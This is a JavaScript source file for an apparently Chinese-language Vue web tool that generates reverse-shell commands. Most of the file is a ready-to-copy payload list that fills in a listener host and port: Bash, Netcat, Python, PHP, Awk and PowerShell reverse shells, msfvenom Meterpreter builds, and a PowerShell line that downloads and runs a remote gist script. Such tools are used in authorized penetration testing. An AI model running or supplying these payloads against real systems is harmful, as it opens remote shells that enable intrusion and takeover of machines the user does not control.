// js/index.js
const { createApp } = Vue;

createApp({
    data() {
        return {
            LHOST: '127.0.0.1',
            LPORT: '4444',
            isDark: true,
            payloads: [
                {
                  name: 'Bash TCP',
                  commands: [
                    { raw: `bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1` },
                    { raw: `/bin/bash -i > /dev/tcp/{{LHOST}}/{{LPORT}} 0<& 2>&1` },
                    { raw: `exec 5<>/dev/tcp/{{LHOST}}/{{LPORT}};cat <&5 | while read line; do $line 2>&5 >&5; done` },
                    { raw: `exec /bin/sh 0</dev/tcp/{{LHOST}}/{{LPORT}} 1>&0 2>&0` },
                    { raw: `0<&196;exec 196<>/dev/tcp/{{LHOST}}/{{LPORT}}; sh <&196 >&196 2>&196` }
                  ]
                },
                {
                  name: 'Bash UDP',
                  commands: [
                    { raw: `sh -i >& /dev/udp/{{LHOST}}/{{LPORT}} 0>&1}} 0>&1` },
                  ]
                },
                {
                  name: 'Netcat',
                  commands: [
                    { raw: `nc -t -e C:\\Windows\\System32\\cmd.exe {{LHOST}} {{LPORT}}` },
                    { raw: `nc -e /bin/sh {{LHOST}} {{LPORT}}` },
                    { raw: `nc -e /bin/bash {{LHOST}} {{LPORT}}` },
                    { raw: `nc -c bash {{LHOST}} {{LPORT}}` },
                    { raw: `mknod backpipe p && nc {{LHOST}} {{LPORT}} 0<backpipe | /bin/bash 1>backpipe` },
                    { raw: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {{LHOST}} {{LPORT}} >/tmp/f` },
                    { raw: `rm -f /tmp/p; mknod /tmp/p p && nc {{LHOST}} {{LPORT}} 0/tmp/p 2>&1` },
                    { raw: `rm f;mkfifo f;cat f|/bin/sh -i 2<&1|nc {{LHOST}} {{LPORT}} < f` },
                    { raw: `rm -f x; mknod x p && nc {{LHOST}} {{LPORT}} 0<x | /bin/bash 1>x` }
                  ]
                },
                {
                  name: 'Python',
                  commands: [
                    { 
                      raw: `python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("{{LHOST}}",{{LPORT}}));` +
                           `[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'` 
                    },
                    { 
                      raw: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);` +
                           `s.connect(("{{LHOST}}",{{LPORT}}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); ` +
                           `os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'` 
                    },
                    { 
                      raw: `export RHOST="{{LHOST}}";export RPORT={{LPORT}};` +
                           `python3 -c 'import sys,socket,os,pty;s=socket.socket();` +
                           `s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));` +
                           `[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'` 
                    },
                    { 
                      raw: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);` +
                           `s.connect(("{{LHOST}}",{{LPORT}}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);` +
                           `os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'` 
                    }
                  ]
                },
                {
                  name: 'PHP',
                  commands: [
                    { raw: `php -r '$sock=fsockopen("{{LHOST}}",{{LPORT}});exec("/bin/sh -i <&3 >&3 2>&3");'` },
                    { raw: `php -r '$s=fsockopen("{{LHOST}}",{{LPORT}});$proc=proc_open("/bin/sh -i", array(0=>$s, 1=>$s, 2=>$s),$pipes);'` },
                    { raw: `php -r '$s=fsockopen("{{LHOST}}",{{LPORT}});shell_exec("/bin/sh -i <&3 >&3 2>&3");'` },
                    { raw: `php -r '$s=fsockopen("{{LHOST}}",{{LPORT}});\`/bin/sh -i <&3 >&3 2>&3\`;'` },
                    { raw: `php -r '$s=fsockopen("{{LHOST}}",{{LPORT}});system("/bin/sh -i <&3 >&3 2>&3");'` },
                    { raw: `php -r '$s=fsockopen("{{LHOST}}",{{LPORT}});popen("/bin/sh -i <&3 >&3 2>&3", "r");'` },
                    { 
                      raw: `php -r '$s="{{LHOST}}";$p={{LPORT}};@error_reporting(0);@ini_set("error_log",NULL);` +
                           `@ini_set("log_errors",0);@set_time_limit(0);umask(0);if($s=fsockopen($s,$p,$n,$n)){` +
                           `if($x=proc_open(\'/bin/sh$IFS-i\',array(array(\'pipe\',\'r\'),array(\'pipe\',\'w\'),` +
                           `array(\'pipe\',\'w\')),$p,getcwd())){stream_set_blocking($p[0],0);` +
                           `stream_set_blocking($p[1],0);stream_set_blocking($p[2],0);stream_set_blocking($s,0);` +
                           `while(1){if(feof($s))die;if(feof($p[1]))die;$r=array($s,$p[1],$p[2]);` +
                           `stream_select($r,$w,$e,0);if($r){foreach($r as $h){if($h==$s)$p[0]&&` +
                           `fwrite($p[0],fread($s,4096));elseif($h==$p[1])fwrite($s,fread($p[1],4096));` +
                           `elseif($h==$p[2])fwrite($s,fread($p[2],4096));}}}}}else{die("proc_open failed");};'` 
                    }
                  ]
                },

                {
                  name: 'Awk',
                  commands: [
                    { raw: `awk 'BEGIN {s = "/inet/tcp/0/10.10.10.11/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null`
                    },
                ]
                },

                {
                  name: 'PowerShell',
                  commands: [
                    { 
                        raw: `powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('{{LHOST}}',{{LPORT}});` +
                             `$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);` +
                             `function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};` +
                             `$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';` +
                             `while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {` +
                             `$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);` +
                             `$Output = try {Invoke-Expression $Command | Out-String} catch {$_ | Out-String};` +
                             `WriteToStream ($Output)}$StreamWriter.Close()"` 
                      },
                    {
                        raw: `powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1') # 注意需要配置远程脚本`,
                    },

                    { 
                      raw: `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{{LHOST}}',{{LPORT}});` +
                           `$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};` +
                           `while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;` +
                           `$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);` +
                           `$sendback = (iex $data 2>&1 | Out-String );` +
                           `$sendback2 = $sendback + 'PS ' + (pwd).Path + '> [*] RE_SHELL  ';` +
                           `$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);` +
                           `$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"` 
                    },
                    { 
                        raw: `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{{LHOST}}",{{LPORT}});`+
                        `$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){`+
                        `;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );`+
                        `$sendback2  = $sendback + "PS " + (pwd).Path + "> > [*] RE_SHELL   ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);`+
                        `$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`
                      },
                  ]
                },
                {
                    "name": "Meterpreter",
                    "commands": [
                      { "raw": `msfvenom -p windows/meterpreter/reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f exe > reverse.exe` },
                      { "raw": `msfvenom -p windows/shell_reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f exe > reverse.exe` },
                      { "raw": `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f elf > reverse.elf` },
                      { "raw": `msfvenom -p linux/x86/shell_reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f elf > reverse.elf` },
                      { "raw": `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f elf > shell.elf` },
                      { "raw": `msfvenom -p windows/meterpreter/reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f exe > shell.exe` },
                      { "raw": `msfvenom -p osx/x86/shell_reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f macho > shell.macho` },
                      { "raw": `msfvenom -p windows/meterpreter/reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f asp > shell.asp` },
                      { "raw": `msfvenom -p java/jsp_shell_reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f raw > shell.jsp` },
                      { "raw": `msfvenom -p java/jsp_shell_reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f war > shell.war` },
                      { "raw": `msfvenom -p cmd/unix/reverse_python LHOST={{LHOST}} LPORT={{LPORT}} -f raw > shell.py` },
                      { "raw": `msfvenom -p cmd/unix/reverse_bash LHOST={{LHOST}} LPORT={{LPORT}} -f raw > shell.sh` },
                      { "raw": `msfvenom -p cmd/unix/reverse_perl LHOST={{LHOST}} LPORT={{LPORT}} -f raw > shell.pl` }
                    ]
                    },
                  
              ]
        }
    },
    methods: {
        renderCommand(cmd) {
            return cmd.replace(/{{LHOST}}/g, this.LHOST)
                     .replace(/{{LPORT}}/g, this.LPORT);
        },
        async copyCommand(text) {
            try {
                await navigator.clipboard.writeText(text);
                alert('命令已复制!');
            } catch (err) {
                console.error('复制失败:', err);
            }
        },
        toggleTheme() {
            this.isDark = !this.isDark;
            document.body.classList.toggle('light-mode', !this.isDark);
        }
    }
}).mount('#app');